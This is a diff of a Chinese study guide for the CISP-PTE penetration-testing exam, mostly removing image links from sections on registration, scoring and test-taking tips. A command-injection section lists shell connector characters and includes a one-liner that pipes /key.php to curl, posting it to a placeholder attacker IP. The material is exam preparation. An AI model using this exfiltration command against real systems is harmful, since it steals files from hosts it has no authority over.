@@ -64,13 +64,10 @@ CISP-PTE，全称“注册信息安全专业人员-渗透测试工程师”，�
 
 ![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_19.png)
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_21.png)
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_23.png)
 
 本节中我们来看看如何报名以及需要准备什么。
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_25.png)
 
 ![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_27.png)
 
@@ -96,9 +93,7 @@ CISP-PTE，全称“注册信息安全专业人员-渗透测试工程师”，�
 
 ![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_37.png)
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_39.png)
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_41.png)
 
 ![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_43.png)
 
@@ -138,7 +133,6 @@ CISP-PTE，全称“注册信息安全专业人员-渗透测试工程师”，�
 
 ![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_51.png)
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_53.png)
 
 1.  **客观题（选择题）**：20道，每题1分，共20分。
 2.  **实操题**：共80分，分为两种：
@@ -155,7 +149,6 @@ CISP-PTE，全称“注册信息安全专业人员-渗透测试工程师”，�
 
 ### 考场实战注意事项
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_61.png)
 
 ![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_62.png)
 
@@ -214,7 +207,6 @@ CISP-PTE，全称“注册信息安全专业人员-渗透测试工程师”，�
 
 ![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_66.png)
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_68.png)
 
 *   **常用连接符与绕过**：
     *   管道符：`|`
@@ -231,11 +223,8 @@ CISP-PTE，全称“注册信息安全专业人员-渗透测试工程师”，�
     cat /key.php | curl -X POST --data-binary @- http://攻击机IP:9999
     ```
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_70.png)
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_72.png)
 
-![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_74.png)
 
 ### 4. 文件包含
 
